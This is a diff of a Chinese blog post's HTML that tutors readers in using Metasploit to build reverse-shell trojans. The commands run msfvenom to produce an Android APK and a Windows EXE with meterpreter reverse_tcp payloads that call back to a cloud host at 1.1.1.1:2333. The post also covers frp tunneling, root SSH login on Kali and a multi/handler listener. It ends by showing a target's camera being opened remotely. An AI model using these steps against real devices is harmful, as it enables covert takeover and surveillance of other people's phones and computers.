@@ -6,7 +6,7 @@
 <meta name="robots" content="all,follow">
 <meta name="googlebot" content="index,follow,snippet,archive">
 <title>用Metasploit反弹shell渗透目标手机或Windows设备 | 一只小菜鸡</title>
-<link rel="shortcut icon" href="https://sixi.fun/favicon.ico?v=1562057633360">
+<link rel="shortcut icon" href="https://sixi.fun/favicon.ico?v=1565065680660">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
 <link rel="stylesheet" href="https://sixi.fun/styles/main.css" type='text/css' media='all'>
 
@@ -32,13 +32,13 @@
                         
                             
                         <li id="menu-item" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item">
-                            <a href="https://sixi.fun/tag/i__JBem5D">人生苦短，我用Python</a>
+                            <a href="https://sixi.fun/tag/Awb26QpLB">渗透从入门到放弃</a>
                         </li>
                             
                         
                             
                         <li id="menu-item" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item">
-                            <a href="https://sixi.fun/tag/Awb26QpLB">渗透从入门到放弃</a>
+                            <a href="https://sixi.fun/tag/i__JBem5D">人生苦短，我用Python</a>
                         </li>
                             
                         
@@ -150,17 +150,17 @@
 <h3 id="选购云服务器">选购云服务器：</h3>
 <p>考虑到低延迟等特性，买一台国内普通的云主机就可以了。云主机的话腾讯云有学生特惠价，蛮便宜的。本次是在Ubantu下面搭建的，所以购买好以后，安装一个Ubantu系统即可。</p>
 <h3 id="安装终端">安装终端：</h3>
-<p>安装MobaXterm远程连接主机，再开一个窗口连接本地虚拟机，以方便操作。
-界面如下：
+<p>安装MobaXterm远程连接主机，再开一个窗口连接本地虚拟机，以方便操作。<br>
+界面如下：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/zhongduan.png" alt=""></p>
 <h3 id="环境搭建">环境搭建</h3>
-<p>frp:本地主机网络与云主机的映射；
-frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称frps
+<p>frp:本地主机网络与云主机的映射；<br>
+frps部署机,centos7为例,有外网固定ip,假设ip为1.1.1.1,后文简称frps<br>
 frpc客户机,kali 2.0为例,能访问互联网,后文简称frpc</p>
 <h4 id="云主机配置">云主机配置：</h4>
-<p>下载frp
-Github项目地址:https://github.com/fatedier/frp
-找到最新的releases下载，系统版本自行确认。
+<p>下载frp<br>
+Github项目地址:https://github.com/fatedier/frp<br>
+找到最新的releases下载，系统版本自行确认。<br>
 以下为云主机终端命令：</p>
 <p>1、wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
 <p>2、tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
@@ -168,32 +168,32 @@ Github项目地址:https://github.com/fatedier/frp
 <p>4、rm -rf frpc*</p>
 <h5 id="编写frps配置文件">编写frps配置文件</h5>
 <p>vi frps.ini</p>
-<p>内容如下：
+<p>内容如下：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/vim.png" alt=""></p>
 <p>运行frps</p>
-<p>运行frps,-c参数用于指定配置文件,在同级目录下的话 可以直接运行.frps
+<p>运行frps,-c参数用于指定配置文件,在同级目录下的话 可以直接运行.frps<br>
 ./frps -c ./frps.ini</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p3.png" alt=""></p>
 <h3 id="kali的配置">Kali的配置</h3>
-<p>配置SSH
-允许root远程登陆
+<p>配置SSH<br>
+允许root远程登陆<br>
 编辑ssh配置文件/etc/ssh/sshd_config</p>
 <p><code>root@kali:~ vim /etc/ssh/sshd_config</code></p>
-<p>在配置文件第一行前添加如下语句:
-<code>PermitRootLogin yes</code>
-<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p4.png" alt="">
+<p>在配置文件第一行前添加如下语句:<br>
+<code>PermitRootLogin yes</code><br>
+<img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p4.png" alt=""><br>
 重启SSH并设置为开机自启</p>
-<p><code>root@kali:~ systemctl restart ssh</code>
+<p><code>root@kali:~ systemctl restart ssh</code><br>
 <code>root@kali:~ systemctl enable ssh</code></p>
-<p>验证SSH
-本地使用终端连接虚拟机中的Kali，测试能否连接成功:
+<p>验证SSH<br>
+本地使用终端连接虚拟机中的Kali，测试能否连接成功:<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p5.png" alt=""></p>
 <h4 id="下载frp">下载frp</h4>
-<p>root@thp3:~#
+<p>root@thp3:~#<br>
 wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz</p>
 <p>root@thp3:~# tar -zxvf frp_0.27.0_linux_amd64.tar.gz</p>
 <p>root@thp3:~# cd frp_0.27.0_linux_amd64/</p>
-<p>root@thp3:~#~/frp_0.27.0_linux_amd64&gt; rm -rf frps*</p>
+<p>root@thp3:<sub>#</sub>/frp_0.27.0_linux_amd64&gt; rm -rf frps*</p>
 <h4 id="编写frpc配置文件">编写frpc配置文件</h4>
 <p>root@thp3:~# cd frp_0.27.0_linux_amd64/ vi frpc.ini</p>
 <p>内容如下:</p>
@@ -205,17 +205,17 @@ wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_
 <h3 id="msf反向shell测试">msf反向shell测试</h3>
 <p>现在来进行Metasploit下最基本的反向shell测试，看看能不能成功建立会话连接。</p>
 <h4 id="生成payload">生成Payload</h4>
-<p>使用msfvenom生成安卓手机APP木马
+<p>使用msfvenom生成安卓手机APP木马<br>
 <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 R &gt; /lol.apk</code></p>
 <p>使用msfvenom生成exe木马</p>
-<p><code>root@kali:~&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe &gt; sqlsec.exe</code>
+<p><code>root@kali:~&gt; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=2333 -f exe &gt; sqlsec.exe</code><br>
 *注意：这里的1.1.1.1是外网云主机的IP地址，2333是映射到外网的端口，并且要将云主机的相应端口打开，如图：</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/server.png" alt=""></p>
-<p>添加frpc规则
+<p>添加frpc规则<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p6.png" alt=""></p>
-<p>将Kali的4444端口转发到外网1.1.1.1的2333端口。
-运行frps和frpc
-分别在云主机和Kali下运行frps和frpc
+<p>将Kali的4444端口转发到外网1.1.1.1的2333端口。<br>
+运行frps和frpc<br>
+分别在云主机和Kali下运行frps和frpc<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p8.png" alt=""></p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/2019-06-14_p9.png" alt=""></p>
 <h4 id="msf监听反弹的shell">msf监听反弹的shell</h4>
@@ -247,9 +247,9 @@ msf5 exploit(multi/handler) &gt; run
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p12.jpg" alt=""></p>
 <p>手机安装：</p>
 <p><img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p10.jpg" alt=""></p>
-<p>测试远程打开目标主机摄像头：
+<p>测试远程打开目标主机摄像头：<br>
 <img src="https://blog-1259440694.cos.ap-chengdu.myqcloud.com/1/p11.jpg" alt=""></p>
-<p>在ssh连接时要打开云主机的相应端口：如
+<p>在ssh连接时要打开云主机的相应端口：如<br>
 由于测试时没搭建博客，部分图片不全。</p>
 <hr>
 <p>革命尚未成功，同志仍需努力..............</p>
@@ -263,11 +263,11 @@ msf5 exploit(multi/handler) &gt; run
                 
                   
                     
-                  <a href="https://sixi.fun/tag/i__JBem5D" title="View all posts in 人生苦短，我用Python">人生苦短，我用Python</a>
-                    
-                    
-                    
                   <a href="https://sixi.fun/tag/Awb26QpLB" title="View all posts in 渗透从入门到放弃">渗透从入门到放弃</a>
+                    
+                    
+                    
+                  <a href="https://sixi.fun/tag/i__JBem5D" title="View all posts in 人生苦短，我用Python">人生苦短，我用Python</a>
                     
                     
               </p>
@@ -279,7 +279,7 @@ msf5 exploit(multi/handler) &gt; run
           </div>
           <div class="author-meta">
             <div class="author">
-              <img alt='' src="https://sixi.fun/images/avatar.png?v=1562057633360" class='avatar avatar-72 photo' height='72' width='72'>
+              <img alt='' src="https://sixi.fun/images/avatar.png?v=1565065680660" class='avatar avatar-72 photo' height='72' width='72'>
               <span>WRITTEN BY: &nbsp;&nbsp;&nbsp;<a href='https://sixi.fun'></a> </span>
             </div>
             <div class="bio">
